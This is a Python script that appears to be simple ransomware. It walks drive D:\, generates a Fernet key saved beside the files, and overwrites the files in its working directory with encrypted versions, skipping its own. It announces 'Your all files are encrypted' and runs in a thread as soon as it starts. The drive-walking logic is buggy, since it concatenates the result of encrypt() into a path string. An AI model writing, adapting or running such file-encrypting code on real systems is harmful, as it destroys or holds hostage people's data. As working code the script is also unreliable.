import os, time, platform
from threading import Thread
from cryptography.fernet import Fernet
import cryptography
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from colorama import Fore, Back, Style

# drive = ["D:\\", "E:\\", "F:\\"]
drive = ["D:\\"]

def encrypt():
    # # Encryption Start  ===============================
    files = []

    for file in os.listdir():
        if file == "encrypt.py" or file == "decrypt.py" or file == "index.py" or file == "index.html" or file == "find.py" or file == "thekey.key" or file == "opratingSys.txt":
            continue
        if os.path.isfile(file):
            files.append(file)
        
    print(files)
    key = Fernet.generate_key()
    # print(key)

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)


    
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print("Ok tata byby byby khatam !!!\n Your all files are encrypted. ")
    # # Encryption End ===========================================

def drives():
    for path in drive[0:]:
        path = os.walk(path)
        if (platform.system().lower() == "windows"):
            os.system("cls")
            for root, dirc, files in path:
                for dirctory in dirc:
                    dircName = root + "\\" + dirctory + encrypt()
                    # print("_" * 60)
                    # print(f"Folder path : {dircName}")
                    # encrypt()

                for file in files:
                    sourspath = root + "\\" + file
                    print("_" * 60)
                    print(f"File path : {sourspath}")             
                # time.sleep(1)
        else :
            os.system("clear")
            
            for root, dirc, files in path:
                for file in files:
                    sourspath = root + "//" + file
                    print("_" * 60)
                    print(f"{Back.GREEN} File path : {sourspath}")

                for dirctory in dirc:
                    dircName = root + "//" + dirctory
                    print("_" * 60)
                    print(f"Folder path : {dircName}")
                # time.sleep(0.1)
        
        
          
thread = Thread(target=drives).start()
# thread = Thread(target=drives).start().join()
